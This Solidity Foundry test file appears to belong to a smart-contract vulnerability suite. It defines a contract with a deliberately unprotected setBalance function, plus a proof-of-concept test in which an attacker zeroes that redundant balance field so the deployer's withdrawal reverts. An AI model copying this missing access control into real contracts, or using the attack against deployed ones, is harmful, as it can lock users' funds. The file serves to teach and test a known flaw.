pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Vulnerable contract from 5.2.5-Extraneous-Field-Declaration-vulnerability.sol
contract Vulnerable {
    uint public balance;
    mapping(address => uint) internal userBalance;

    constructor() payable {
        userBalance[msg.sender] = msg.value;
        balance = msg.value;
    }

    function withdraw(uint _amount) public {
        require(userBalance[msg.sender] >= _amount, "Insufficient funds");
        userBalance[msg.sender] -= _amount;
        // This operation relies on extraneous balance. If manipulated, it may underflow.
        balance -= _amount; 
        payable(msg.sender).transfer(_amount);
    }

    function setBalance(uint _newBalance) public {
        balance = _newBalance;
    }

    function getUserBalance(address _user) public view returns (uint) {
        return userBalance[_user];
    }
}

contract ExtraneousFieldTest is Test {
    Vulnerable public vulnerable;

    // Use non-precompile addresses for deployer and attacker
    address public deployer = address(0x100);
    address public attacker = address(0x200);

    function setUp() public {
        // Fund deployer with 10 ETH and attacker with 1 ETH
        vm.deal(deployer, 10 ether);
        vm.deal(attacker, 1 ether);

        // Deploy Vulnerable contract from deployer with 10 ETH
        vm.prank(deployer);
        vulnerable = new Vulnerable{value: 10 ether}();
    }

    function testExploit() public {
        // Check initial balances: both mapping and extraneous field should be 10 ETH
        uint mappingBalance = vulnerable.getUserBalance(deployer);
        uint extraneousBalance = vulnerable.balance();
        assertEq(mappingBalance, 10 ether, "Initial mapping balance should be 10 ETH");
        assertEq(extraneousBalance, 10 ether, "Initial extraneous field balance should be 10 ETH");

        // Attacker exploits the extraneous field by setting it to 0, desyncing it from mapping state
        vm.prank(attacker);
        vulnerable.setBalance(0);
        uint modifiedBalance = vulnerable.balance();
        assertEq(modifiedBalance, 0, "Extraneous field should be modified to 0");

        // Now, even though the deployer has 10 ETH recorded in the mapping, the withdraw will fail
        // because balance subtraction (0 - _amount) will underflow in Solidity 0.8.0
        vm.prank(deployer);
        vm.expectRevert(); // Expect revert due to underflow in balance subtraction
        vulnerable.withdraw(5 ether);
    }

    function testWithdrawFailForAttacker() public {
        // Attacker has no balance in the mapping, so even if they set the extraneous field,
        // their withdrawal should fail due to the mapping check
        vm.prank(attacker);
        vulnerable.setBalance(100 ether);

        vm.prank(attacker);
        vm.expectRevert("Insufficient funds");
        vulnerable.withdraw(1 ether);
    }
}
